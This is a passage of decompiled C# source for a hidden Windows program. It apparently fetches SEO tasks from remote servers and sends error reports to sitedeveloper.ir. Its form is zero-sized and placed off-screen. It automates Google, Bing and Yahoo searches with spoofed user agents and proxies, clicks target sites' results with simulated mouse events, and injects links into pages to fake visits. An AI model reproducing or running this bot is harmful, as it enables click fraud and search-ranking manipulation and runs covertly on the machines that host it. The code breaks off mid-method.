using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace Target;

public class Form1 : Form
{
	private class countlist
	{
		public int count = 0;

		public string name = "";
	}

	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("3050F669-48B5-11CF-BB82-00AA00BDCE0B")]
	private interface IHTMLElementRenderFixed
	{
		void DrawToDC(IntPtr hdc);

		void SetDocumentPrinter(string bstrPrinterName, IntPtr hdc);
	}

	[Flags]
	private enum InternetConnectionState_e
	{
		INTERNET_CONNECTION_MODEM = 1,
		INTERNET_CONNECTION_LAN = 2,
		INTERNET_CONNECTION_PROXY = 4,
		INTERNET_RAS_INSTALLED = 0x10,
		INTERNET_CONNECTION_OFFLINE = 0x20,
		INTERNET_CONNECTION_CONFIGURED = 0x40
	}

	public class SeoPanExtInfo
	{
		private int _Id;

		private string _Titel;

		private string _Url;

		private string _Keywords;

		private int _Actions;

		private string _Location;

		private int _BrowserPages;

		private int _MaxSeoEnginPage;

		private int _DMAX_Browse;

		private int _DMAX_Loop;

		private int _DMAX_Match;

		private int _DMAX_Search;

		private int _DMIN_Browse;

		private int _DMIN_Loop;

		private int _DMIN_Match;

		private int _DMIN_Search;

		private string _InternalUrls;

		private string _actionurl;

		public int Id
		{
			get
			{
				return _Id;
			}
			set
			{
				_Id = value;
			}
		}

		public string Titel
		{
			get
			{
				return _Titel;
			}
			set
			{
				_Titel = value;
			}
		}

		public string Url
		{
			get
			{
				return _Url;
			}
			set
			{
				_Url = value;
			}
		}

		public string Keywords
		{
			get
			{
				return _Keywords;
			}
			set
			{
				_Keywords = value;
			}
		}

		public int Actions
		{
			get
			{
				return _Actions;
			}
			set
			{
				_Actions = value;
			}
		}

		public string Location
		{
			get
			{
				return _Location;
			}
			set
			{
				_Location = value;
			}
		}

		public int BrowserPages
		{
			get
			{
				return _BrowserPages;
			}
			set
			{
				_BrowserPages = value;
			}
		}

		public int MaxSeoEnginPage
		{
			get
			{
				return _MaxSeoEnginPage;
			}
			set
			{
				_MaxSeoEnginPage = value;
			}
		}

		public int DMAX_Browse
		{
			get
			{
				return _DMAX_Browse;
			}
			set
			{
				_DMAX_Browse = value;
			}
		}

		public int DMAX_Loop
		{
			get
			{
				return _DMAX_Loop;
			}
			set
			{
				_DMAX_Loop = value;
			}
		}

		public int DMAX_Match
		{
			get
			{
				return _DMAX_Match;
			}
			set
			{
				_DMAX_Match = value;
			}
		}

		public int DMAX_Search
		{
			get
			{
				return _DMAX_Search;
			}
			set
			{
				_DMAX_Search = value;
			}
		}

		public int DMIN_Browse
		{
			get
			{
				return _DMIN_Browse;
			}
			set
			{
				_DMIN_Browse = value;
			}
		}

		public int DMIN_Loop
		{
			get
			{
				return _DMIN_Loop;
			}
			set
			{
				_DMIN_Loop = value;
			}
		}

		public int DMIN_Match
		{
			get
			{
				return _DMIN_Match;
			}
			set
			{
				_DMIN_Match = value;
			}
		}

		public int DMIN_Search
		{
			get
			{
				return _DMIN_Search;
			}
			set
			{
				_DMIN_Search = value;
			}
		}

		public string InternalUrls
		{
			get
			{
				return _InternalUrls;
			}
			set
			{
				_InternalUrls = value;
			}
		}

		public string actionurl
		{
			get
			{
				return _actionurl;
			}
			set
			{
				_actionurl = value;
			}
		}
	}

	private IContainer components = null;

	private Timer TimerWiting;

	private List<string> Urlsites = new List<string>();

	private Random random = new Random();

	private bool bStop = false;

	private int UnblockTime = 0;

	private int PageLoadFinished;

	public List<string> Lsinnerurl = new List<string>();

	public List<string> LsKeywords = new List<string>();

	public string LsUserAgents = "";

	public string LsUserReferers = "";

	private string EnginBrowser = "";

	private int currpage = 1;

	private int counter = 0;

	private string MACAddress = "";

	private object[] ListGoogle = new object[201]
	{
		"http://www.google.com", "http://www.google.ac", "http://www.google.ad", "http://www.google.ae", "http://www.google.com.af", "http://www.google.com.ag", "http://www.google.com.ai", "http://www.google.al", "http://www.google.am", "http://www.google.co.ao",
		"http://www.google.com.ar", "http://www.google.as", "http://www.google.at", "http://www.google.com.au", "http://www.google.az", "http://www.google.ba", "http://www.google.com.bd", "http://www.google.be", "http://www.google.bf", "http://www.google.bg",
		"http://www.google.com.bh", "http://www.google.bi", "http://www.google.bj", "http://www.google.com.bn", "http://www.google.com.bo", "http://www.google.com.br", "http://www.google.bs", "http://www.google.co.bw", "http://www.google.com.by", "http://www.google.by/",
		"http://www.google.com.bz", "http://www.google.ca", "http://www.google.com.kh", "http://www.google.cc", "http://www.google.cd", "http://www.google.cf", "http://www.google.cat", "http://www.google.cg", "http://www.google.ch", "http://www.google.ci",
		"http://www.google.co.ck", "http://www.google.cl", "http://www.google.cm", "http://www.google.cn", "http://www.g.cn", "http://www.google.com.co", "http://www.google.co.cr", "http://www.google.com.cu", "http://www.google.cv", "http://www.google.com.cy",
		"http://www.google.cz", "http://www.google.de", "http://www.google.dj", "http://www.google.dk", "http://www.google.dm", "http://www.google.com.do", "http://www.google.dz", "http://www.google.com.ec", "http://www.google.ee", "http://www.google.com.eg",
		"http://www.google.es", "http://www.google.com.et", "http://www.google.fi", "http://www.google.com.fj", "http://www.google.fm", "http://www.google.fr", "http://www.google.ga", "http://www.google.ge", "http://www.google.gf", "http://www.google.gg",
		"http://www.google.com.gh", "http://www.google.com.gi", "http://www.google.gl/", "http://www.google.gm/", "http://www.google.gp/", "http://www.google.gr/", "http://www.google.com.gt/", "http://www.google.gy/", "http://www.google.com.hk/", "http://www.google.hn/",
		"http://www.google.hr/", "http://www.google.ht/", "http://www.google.hu/", "http://www.google.co.id/", "http://www.google.iq/", "http://www.google.ie/", "http://www.google.co.il/", "http://www.google.im/", "http://www.google.co.in/", "http://www.google.io/",
		"http://www.google.is/", "http://www.google.it/", "http://www.google.je/", "http://www.google.com.jm/", "http://www.google.jo/", "http://www.google.co.jp/", "http://www.google.co.ke/", "http://www.google.com.kh/", "http://www.google.ki/", "http://www.google.kg/",
		"http://www.google.co.kr/", "http://www.google.com.kw/", "http://www.google.kz/", "http://www.google.la/", "http://www.google.com.lb/", "http://www.google.com.lc/", "http://www.google.li/", "http://www.google.lk/", "http://www.google.co.ls/", "http://www.google.lt/",
		"http://www.google.lu/", "http://www.google.lv/", "http://www.google.com.ly/", "http://www.google.co.ma/", "http://www.google.md/", "http://www.google.me/", "http://www.google.mg/", "http://www.google.mk/", "http://www.google.ml/", "http://www.google.mn/",
		"http://www.google.ms/", "http://www.google.com.mt/", "http://www.google.mu/", "http://www.google.mv/", "http://www.google.mw/", "http://www.google.com.mx/", "http://www.google.com.my/", "http://www.google.co.mz/", "http://www.google.com.na/", "http://www.google.ne/",
		"http://www.google.com.nf/", "http://www.google.com.ng/", "http://www.google.com.ni/", "http://www.google.nl/", "http://www.google.no/", "http://www.google.com.np/", "http://www.google.nr/", "http://www.google.nu/", "http://www.google.co.nz/", "http://www.google.com.om/",
		"http://www.google.com.pa/", "http://www.google.com.pe/", "http://www.google.com.ph/", "http://www.google.com.pk/", "http://www.google.pl/", "http://www.google.com.pg/", "http://www.google.pn/", "http://www.google.com.pr/", "http://www.google.ps/", "http://www.google.pt/",
		"http://www.google.com.py/", "http://www.google.com.qa/", "http://www.google.ro/", "http://www.google.rs/", "http://www.google.ru/", "http://www.google.rw/", "http://www.google.com.sa/", "http://www.google.com.sb/", "http://www.google.sc/", "http://www.google.se/",
		"http://www.google.com.sg/", "http://www.google.sh/", "http://www.google.si/", "http://www.google.sk/", "http://www.google.com.sl/", "http://www.google.sn/", "http://www.google.sm/", "http://www.google.so/", "http://www.google.st/", "http://www.google.com.sv/",
		"http://www.google.td/", "http://www.google.tg/", "http://www.google.co.th/", "http://www.google.com.tj/", "http://www.google.tk/", "http://www.google.tl/", "http://www.google.tm/", "http://www.google.to/", "http://www.google.com.tn/", "http://www.google.com.tr/",
		"http://www.google.tt/", "http://www.google.com.tw/", "http://www.google.co.tz/", "http://www.google.com.ua/", "http://www.google.ua/", "http://www.google.co.ug/", "http://www.google.co.uk/", "http://www.google.us/", "http://www.google.com.uy/", "http://www.google.co.uz/",
		"http://www.google.com.vc/", "http://www.google.co.ve/", "http://www.google.vg/", "http://www.google.co.vi/", "http://www.google.com.vn/", "http://www.google.vn/", "http://www.google.vu", "http://www.google.ws", "http://www.google.co.za", "http://www.google.co.zm",
		"http://www.google.co.zw"
	};

	private object[] ListYahoo = new object[11]
	{
		"https://ar.search.yahoo.com/", "https://at.search.yahoo.com", "https://se.search.yahoo.com", "https://sg.search.yahoo.com", "https://th.search.yahoo.com", "https://tr.search.yahoo.com", "https://tw.search.yahoo.com", "https://uk.search.yahoo.com", "https://ve.search.yahoo.com", "https://vn.search.yahoo.com",
		"https://za.search.yahoo.com"
	};

	private object[] ListYandex = new object[6] { "https://yandex.by/", "https://yandex.com/", "https://yandex.kz/", "https://yandex.ru/", "https://yandex.com.tr/", "https://yandex.ua/" };

	private HashSet<string> dic = new HashSet<string>();

	private const int FEATURE_DISABLE_NAVIGATION_SOUNDS = 21;

	private const int SET_FEATURE_ON_PROCESS = 2;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		TimerWiting = new Timer(components);
		((Control)this).SuspendLayout();
		TimerWiting.set_Interval(1000);
		TimerWiting.add_Tick((EventHandler)TimerWiting_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Location(new Point(999999999, 999999999));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool InternetSetOption(int hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("KERNEL32.DLL", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	internal static extern bool SetProcessWorkingSetSize(IntPtr pProcess, int dwMinimumWorkingSetSize, int dwMaximumWorkingSetSize);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

	[DllImport("KERNEL32.DLL", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("wininet.dll")]
	private static extern bool InternetGetConnectedState(out int Description, int ReservedValue);

	public static bool IsConnectedToInternet()
	{
		int Description = 0;
		if (InternetGetConnectedState(out Description, 0))
		{
			try
			{
				string text = new Request().Execute($"https://google.com").ToString();
				if (text.Length > 500)
				{
					return true;
				}
				return false;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	[DllImport("urlmon.dll")]
	[return: MarshalAs(UnmanagedType.Error)]
	private static extern int CoInternetSetFeatureEnabled(int FeatureEntry, [MarshalAs(UnmanagedType.U4)] int dwFlags, bool fEnable);

	private static void DisableClickSounds()
	{
		CoInternetSetFeatureEnabled(21, 2, fEnable: true);
	}

	private void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
	{
		try
		{
			Start();
		}
		catch
		{
		}
	}

	private void geturl()
	{
		Urlsites.Clear();
		Urlsites.Add("http://persiameg.com");
		Urlsites.Add("http://seo.espritnews.com");
		Urlsites.Add("http://ranking3web.com");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		bool flag = false;
		try
		{
			DisableClickSounds();
		}
		catch
		{
		}
		MACAddress = GetMACAddress().Replace("0", "");
		try
		{
			Application.add_ThreadException((ThreadExceptionEventHandler)Application_ThreadException);
			Start();
		}
		catch (Exception ex)
		{
			string url = $"http://sitedeveloper.ir/DesktopModules/DnnSeoPlusdnn/API/PlusDnnseo/GetError_Handel?errorMessage={ex.Message}";
			Request request = new Request();
			request.Execute(url).ToString();
			try
			{
				Start();
			}
			catch (Exception ex2)
			{
				if (!flag)
				{
					url = $"http://sitedeveloper.ir/DesktopModules/DnnSeoPlusdnn/API/PlusDnnseo/GetError_Handel?errorMessage={ex2.Message}";
					request = new Request();
					request.Execute(url).ToString();
					((Form)this).Close();
				}
			}
		}
	}

	private void Start()
	{
		//IL_0289: Unknown result type (might be due to invalid IL or missing references)
		//IL_028f: Invalid comparison between Unknown and I4
		//IL_0298: Unknown result type (might be due to invalid IL or missing references)
		//IL_029e: Invalid comparison between Unknown and I4
		//IL_0347: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Expected O, but got Unknown
		//IL_0393: Unknown result type (might be due to invalid IL or missing references)
		//IL_0399: Invalid comparison between Unknown and I4
		//IL_0408: Unknown result type (might be due to invalid IL or missing references)
		//IL_040f: Expected O, but got Unknown
		//IL_0510: Unknown result type (might be due to invalid IL or missing references)
		//IL_0516: Invalid comparison between Unknown and I4
		//IL_0952: Unknown result type (might be due to invalid IL or missing references)
		//IL_0958: Invalid comparison between Unknown and I4
		//IL_0961: Unknown result type (might be due to invalid IL or missing references)
		//IL_0967: Invalid comparison between Unknown and I4
		//IL_0a10: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a17: Expected O, but got Unknown
		//IL_0a52: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a58: Invalid comparison between Unknown and I4
		//IL_0ac7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ace: Expected O, but got Unknown
		//IL_0bd4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bda: Invalid comparison between Unknown and I4
		//IL_0eb2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eb8: Invalid comparison between Unknown and I4
		//IL_0ec1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ec7: Invalid comparison between Unknown and I4
		//IL_0f68: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f6f: Expected O, but got Unknown
		//IL_0faa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb0: Invalid comparison between Unknown and I4
		//IL_101f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1026: Expected O, but got Unknown
		//IL_1138: Unknown result type (might be due to invalid IL or missing references)
		//IL_113e: Invalid comparison between Unknown and I4
		//IL_13d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_13dd: Invalid comparison between Unknown and I4
		//IL_13e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_13ec: Invalid comparison between Unknown and I4
		//IL_1487: Unknown result type (might be due to invalid IL or missing references)
		//IL_148e: Expected O, but got Unknown
		//IL_14ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_14f2: Invalid comparison between Unknown and I4
		//IL_1565: Unknown result type (might be due to invalid IL or missing references)
		//IL_156c: Expected O, but got Unknown
		//IL_1675: Unknown result type (might be due to invalid IL or missing references)
		//IL_167b: Invalid comparison between Unknown and I4
		//IL_18c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_18ce: Expected O, but got Unknown
		//IL_1afb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b35: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b3c: Expected O, but got Unknown
		//IL_1d94: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d9b: Expected O, but got Unknown
		geturl();
		while (true)
		{
			try
			{
				if (!IsConnectedToInternet())
				{
					continue;
				}
				List<SeoPanExtInfo> list = new List<SeoPanExtInfo>();
				foreach (string urlsite in Urlsites)
				{
					try
					{
						foreach (SeoPanExtInfo item2 in GetList(urlsite))
						{
							list.Add(item2);
						}
					}
					catch
					{
					}
				}
				foreach (SeoPanExtInfo item3 in list)
				{
					LsKeywords.Clear();
					Lsinnerurl.Clear();
					string[] array = item3.InternalUrls.Split(new char[1] { '\n' });
					foreach (string text in array)
					{
						if (!string.IsNullOrEmpty(text))
						{
							Lsinnerurl.Add(text);
						}
					}
					string[] array2 = item3.Keywords.Split(new char[1] { ',' });
					foreach (string text2 in array2)
					{
						if (!string.IsNullOrEmpty(text2))
						{
							LsKeywords.Add(text2);
						}
					}
					switch (item3.Actions)
					{
					case 1:
					{
						string user_agent7 = loadUserAgent(item3.actionurl);
						object[] listGoogle = ListGoogle;
						for (int num7 = 0; num7 < listGoogle.Length; num7++)
						{
							string text13 = (string)listGoogle[num7];
							if (text13.ToLower().Contains(item3.Location.ToLower()))
							{
								EnginBrowser = text13 + "/ncr";
								break;
							}
						}
						WebBrowserWithProxy webBrowserWithProxy10 = new WebBrowserWithProxy();
						try
						{
							((WebBrowser)webBrowserWithProxy10).set_ScriptErrorsSuppressed(true);
							((WebBrowser)webBrowserWithProxy10).set_ObjectForScripting((object)true);
							webBrowserWithProxy10.user_agent = user_agent7;
							foreach (string lsKeyword in LsKeywords)
							{
								currpage = 1;
								((WebBrowser)webBrowserWithProxy10).Navigate(EnginBrowser);
								WaitPage(10);
								Wait(this.random.Next(item3.DMIN_Search, item3.DMAX_Search));
								while ((int)((WebBrowser)webBrowserWithProxy10).get_ReadyState() != 4)
								{
									Application.DoEvents();
								}
								if ((int)((WebBrowser)webBrowserWithProxy10).get_ReadyState() == 4)
								{
									try
									{
										((Control)this).Focus();
										((WebBrowser)webBrowserWithProxy10).get_Document().get_All().GetElementsByName("q")
											.get_Item(0)
											.SetAttribute("value", lsKeyword);
										((WebBrowser)webBrowserWithProxy10).get_Document().get_All().GetElementsByName("q")
											.get_Item(0)
											.Focus();
										Wait(3);
										((Control)webBrowserWithProxy10).Focus();
										Application.DoEvents();
										SendKeys.Send("{ENTER}");
										try
										{
											Thread.Sleep(100);
											HtmlElementCollection elementsByTagName10 = ((WebBrowser)webBrowserWithProxy10).get_Document().GetElementsByTagName("Form");
											IEnumerator enumerator17 = elementsByTagName10.GetEnumerator();
											try
											{
												if (enumerator17.MoveNext())
												{
													HtmlElement val21 = (HtmlElement)enumerator17.Current;
													val21.InvokeMember("submit");
												}
											}
											finally
											{
												IDisposable disposable = enumerator17 as IDisposable;
												if (disposable != null)
												{
													disposable.Dispose();
												}
											}
											Application.DoEvents();
										}
										catch
										{
										}
									}
									catch
									{
										Application.DoEvents();
										break;
									}
								}
								do
								{
									Wait(this.random.Next(item3.DMIN_Match, item3.DMAX_Match));
									HtmlElement val22 = null;
									while ((int)((WebBrowser)webBrowserWithProxy10).get_ReadyState() != 4)
									{
										Application.DoEvents();
									}
									HtmlElementCollection elementsByTagName11 = ((WebBrowser)webBrowserWithProxy10).get_Document().GetElementsByTagName("a");
									string text14 = item3.Url.Replace("http://", "").Replace("https://", "");
									string value = text14.Split(new char[1] { '/' })[0].ToLower();
									IEnumerator enumerator18 = elementsByTagName11.GetEnumerator();
									try
									{
										while (enumerator18.MoveNext())
										{
											HtmlElement val23 = (HtmlElement)enumerator18.Current;
											if (!val23.GetAttribute("href").ToLower().Contains(value))
											{
												if (val23.GetAttribute("href").Contains("start=" + currpage * 10))
												{
													val22 = val23;
												}
												continue;
											}
											val23.Focus();
											val23.InvokeMember("onmousemove");
											val23.InvokeMember("onmousedown");
											val23.InvokeMember("onmouseup");
											Application.DoEvents();
											val23.InvokeMember("Click");
											WaitPage(10);
											for (int num8 = 0; num8 < item3.BrowserPages; num8++)
											{
												Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
												Application.DoEvents();
												int index7 = this.random.Next(0, Lsinnerurl.Count - 1);
												try
												{
													while ((int)((WebBrowser)webBrowserWithProxy10).get_ReadyState() != 4)
													{
														Application.DoEvents();
													}
													try
													{
														HtmlElement val24 = ((WebBrowser)webBrowserWithProxy10).get_Document().CreateElement("A");
														val24.SetAttribute("HREF", Lsinnerurl[index7]);
														val24.set_InnerText(lsKeyword);
														val24.SetAttribute("rel", "follow");
														((WebBrowser)webBrowserWithProxy10).get_Document().get_Body().AppendChild(val24);
														val24.Focus();
														val24.InvokeMember("onmousemove");
														val24.InvokeMember("onmousedown");
														val24.InvokeMember("onmouseup");
														Application.DoEvents();
														val24.InvokeMember("Click");
														Wait(10);
														Lsinnerurl.RemoveAt(index7);
													}
													catch
													{
														continue;
													}
												}
												catch
												{
													continue;
												}
												break;
											}
											SetAction(item3);
											break;
										}
									}
									catch
									{
									}
									finally
									{
										IDisposable disposable2 = enumerator18 as IDisposable;
										if (disposable2 != null)
										{
											disposable2.Dispose();
										}
									}
									if (counter > 0)
									{
										counter = 0;
										continue;
									}
									if (val22 != (HtmlElement)null)
									{
										Application.DoEvents();
										if (currpage < item3.MaxSeoEnginPage)
										{
											currpage++;
											val22.InvokeMember("click");
											WaitPage(10);
											continue;
										}
										currpage = 1;
										break;
									}
									Wait(15);
									break;
								}
								while (!bStop);
							}
						}
						catch
						{
						}
						finally
						{
							((IDisposable)webBrowserWithProxy10)?.Dispose();
						}
						break;
					}
					case 2:
						try
						{
							string user_agent4 = loadUserAgent(item3.actionurl);
							WebBrowserWithProxy webBrowserWithProxy4 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy4).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy4).set_ObjectForScripting((object)true);
								webBrowserWithProxy4.user_agent = user_agent4;
								webBrowserWithProxy4.Goto1(item3.Url);
								WaitPage(10);
								Application.DoEvents();
								for (int num2 = 0; num2 < item3.BrowserPages; num2++)
								{
									Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
									Application.DoEvents();
									try
									{
										int index5 = this.random.Next(0, Lsinnerurl.Count - 1);
										HtmlElement val10 = ((WebBrowser)webBrowserWithProxy4).get_Document().CreateElement("a");
										val10.SetAttribute("href", Lsinnerurl[index5].Split(new char[1] { ',' })[0]);
										try
										{
											val10.set_InnerText(Lsinnerurl[index5].Split(new char[1] { ',' })[1]);
										}
										catch
										{
											val10.set_InnerText(item3.Keywords.Replace(",", ""));
										}
										val10.SetAttribute("rel", "follow");
										((WebBrowser)webBrowserWithProxy4).get_Document().get_Body().AppendChild(val10);
										val10.Focus();
										val10.InvokeMember("onmousemove");
										val10.InvokeMember("onmousedown");
										val10.InvokeMember("onmouseup");
										Application.DoEvents();
										val10.InvokeMember("Click");
									}
									catch
									{
									}
									WaitPage(10);
									LsUserReferers = ((WebBrowser)webBrowserWithProxy4).get_Url().ToString();
								}
								SetAction(item3);
							}
							catch
							{
							}
							finally
							{
								((IDisposable)webBrowserWithProxy4)?.Dispose();
							}
						}
						catch
						{
						}
						break;
					case 5:
					{
						string user_agent2 = loadUserAgent(item3.actionurl);
						EnginBrowser = "http://www.bing.com/";
						foreach (string lsKeyword2 in LsKeywords)
						{
							WebBrowserWithProxy webBrowserWithProxy2 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy2).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy2).set_ObjectForScripting((object)true);
								webBrowserWithProxy2.user_agent = user_agent2;
								currpage = 1;
								webBrowserWithProxy2.Goto1(EnginBrowser);
								WaitPage(10);
								Wait(this.random.Next(item3.DMIN_Search, item3.DMAX_Search));
								while ((int)((WebBrowser)webBrowserWithProxy2).get_ReadyState() != 4)
								{
									Application.DoEvents();
								}
								if ((int)((WebBrowser)webBrowserWithProxy2).get_ReadyState() == 4)
								{
									try
									{
										((Control)this).Focus();
										((WebBrowser)webBrowserWithProxy2).get_Document().get_All().GetElementsByName("q")
											.get_Item(0)
											.SetAttribute("value", lsKeyword2);
										((WebBrowser)webBrowserWithProxy2).get_Document().get_All().GetElementsByName("q")
											.get_Item(0)
											.Focus();
										Wait(3);
										((Control)webBrowserWithProxy2).Focus();
										Application.DoEvents();
										SendKeys.Send("{ENTER}");
										Thread.Sleep(100);
										HtmlElementCollection elementsByTagName = ((WebBrowser)webBrowserWithProxy2).get_Document().GetElementsByTagName("Form");
										IEnumerator enumerator5 = elementsByTagName.GetEnumerator();
										try
										{
											if (enumerator5.MoveNext())
											{
												HtmlElement val2 = (HtmlElement)enumerator5.Current;
												val2.InvokeMember("submit");
											}
										}
										finally
										{
											IDisposable disposable3 = enumerator5 as IDisposable;
											if (disposable3 != null)
											{
												disposable3.Dispose();
											}
										}
									}
									catch
									{
										Application.DoEvents();
										goto end_IL_08f0;
									}
								}
								do
								{
									Wait(this.random.Next(item3.DMIN_Match, item3.DMAX_Match));
									HtmlElement val3 = null;
									while ((int)((WebBrowser)webBrowserWithProxy2).get_ReadyState() != 4)
									{
										Application.DoEvents();
									}
									HtmlElementCollection elementsByTagName2 = ((WebBrowser)webBrowserWithProxy2).get_Document().GetElementsByTagName("a");
									string text3 = item3.Url.Replace("http://", "").Replace("https://", "");
									string text4 = text3.Split(new char[1] { '/' })[0].ToLower();
									IEnumerator enumerator6 = elementsByTagName2.GetEnumerator();
									try
									{
										while (enumerator6.MoveNext())
										{
											HtmlElement val4 = (HtmlElement)enumerator6.Current;
											if (!val4.GetAttribute("href").ToLower().Contains("//" + text4))
											{
												if (val4.GetAttribute("title").Contains(string.Concat("Next")))
												{
													val3 = val4;
												}
												continue;
											}
											val4.Focus();
											val4.InvokeMember("onmousemove");
											val4.InvokeMember("onmousedown");
											val4.InvokeMember("onmouseup");
											Application.DoEvents();
											val4.InvokeMember("Click");
											WaitPage(10);
											for (int m = 0; m < item3.BrowserPages; m++)
											{
												Wait(this.random.Next(item3.DMIN_Browse, item3.DMAX_Browse));
												Application.DoEvents();
												int index3 = this.random.Next(0, Lsinnerurl.Count - 1);
												try
												{
													while ((int)((WebBrowser)webBrowserWithProxy2).get_ReadyState() != 4)
													{
														Application.DoEvents();
													}
													try
													{
														HtmlElement val5 = ((WebBrowser)webBrowserWithProxy2).get_Document().CreateElement("A");
														val5.SetAttribute("HREF", Lsinnerurl[index3]);
														val5.set_InnerText(lsKeyword2);
														val5.SetAttribute("rel", "follow");
														((WebBrowser)webBrowserWithProxy2).get_Document().get_Body().AppendChild(val5);
														val5.Focus();
														val5.InvokeMember("onmousemove");
														val5.InvokeMember("onmousedown");
														val5.InvokeMember("onmouseup");
														Application.DoEvents();
														val5.InvokeMember("Click");
														Wait(10);
														Lsinnerurl.RemoveAt(index3);
													}
													catch
													{
														continue;
													}
												}
												catch
												{
													continue;
												}
												break;
											}
											SetAction(item3);
											break;
										}
									}
									catch
									{
									}
									finally
									{
										IDisposable disposable4 = enumerator6 as IDisposable;
										if (disposable4 != null)
										{
											disposable4.Dispose();
										}
									}
									if (counter > 0)
									{
										counter = 0;
										continue;
									}
									if (val3 != (HtmlElement)null)
									{
										Application.DoEvents();
										if (currpage < item3.MaxSeoEnginPage)
										{
											currpage++;
											val3.InvokeMember("click");
											WaitPage(10);
											continue;
										}
										currpage = 1;
										break;
									}
									Wait(15);
									break;
								}
								while (!bStop);
								Wait(this.random.Next(item3.DMIN_Loop, item3.DMAX_Loop));
								continue;
								end_IL_08f0:;
							}
							finally
							{
								((IDisposable)webBrowserWithProxy2)?.Dispose();
							}
							break;
						}
						break;
					}
					case 6:
					{
						string user_agent3 = loadUserAgent(item3.actionurl);
						object[] listYahoo = ListYahoo;
						for (int n = 0; n < listYahoo.Length; n++)
						{
							string text5 = (string)listYahoo[n];
							if (text5.ToLower().Contains(item3.Location.ToLower()))
							{
								if (text5.ToLower().Contains("COM"))
								{
									EnginBrowser = "https://search.yahoo.com/";
								}
								else
								{
									EnginBrowser = text5;
								}
								break;
							}
						}
						foreach (string lsKeyword3 in LsKeywords)
						{
							WebBrowserWithProxy webBrowserWithProxy3 = new WebBrowserWithProxy();
							try
							{
								((WebBrowser)webBrowserWithProxy3).set_ScriptErrorsSuppressed(true);
								((WebBrowser)webBrowserWithProxy3).set_ObjectForScripting((object)true);
								webBrowserWithProxy3.user_agent = user_agent3;
								currpage = 1;
								((WebBrowser)webBrowserWithProxy3).Navigate(EnginBrowser);
								WaitPage(10);
								Wait(this.random.Next(item3.DMIN_Search, item3.DMAX_Search));
								while ((int)((WebBrowser)webBrowserWithProxy3).get_ReadyState() != 4)
								{
									Application.DoEvents();
								}
								if ((int)((WebBrowser)webBrowserWithProxy3).get_ReadyState() == 4)
								{
									try
									{
										((Control)this).Focus();
										((WebBrowser)webBrowserWithProxy3).get_Document().GetElementById("yschsp").SetAttribute("value", lsKeyword3);
										((WebBrowser)webBrowserWithProxy3).get_Document().GetElementById("yschsp").Focus();
										Wait(3);
										((Control)webBrowserWithProxy3).Focus();
										Application.DoEvents();
										SendKeys.Send("{ENTER}");
									}
									catch
									{
										Application.DoEvents();
										goto end_IL_0e50;
									}
									try
									{
										Thread.Sleep(100);
										HtmlElementCollection elementsByTagName3 = ((WebBrowser)webBrowserWithProxy3).get_Document().GetElementsByTagName("Form");
										IEnumerator enumerator8 = elementsByTagName3.GetEnumerator();
										try
										{
											if (enumerator8.MoveNext())
											{
												HtmlElement val6 = (HtmlElement)enumerator8.Current;
												val6.InvokeMember("submit");
											}
										}
										finally
										{
											IDisposable disposable5 = enumerator8 as IDisposable;
											if (disposable5 != null)
											{
												disposable5.Dispose();
											}
										}
										Application.DoEvents();
									}
									catch
									{
									}
								}
								do
								{
									Wait(this.random.Next(item3.DMIN_Match, item3.DMAX_Match));
									HtmlElement val7 = null;
									while ((int)((WebBrowser)webBrowserWithProxy3).get_ReadyState() != 4)
									{
										Application.DoEvents();
									}
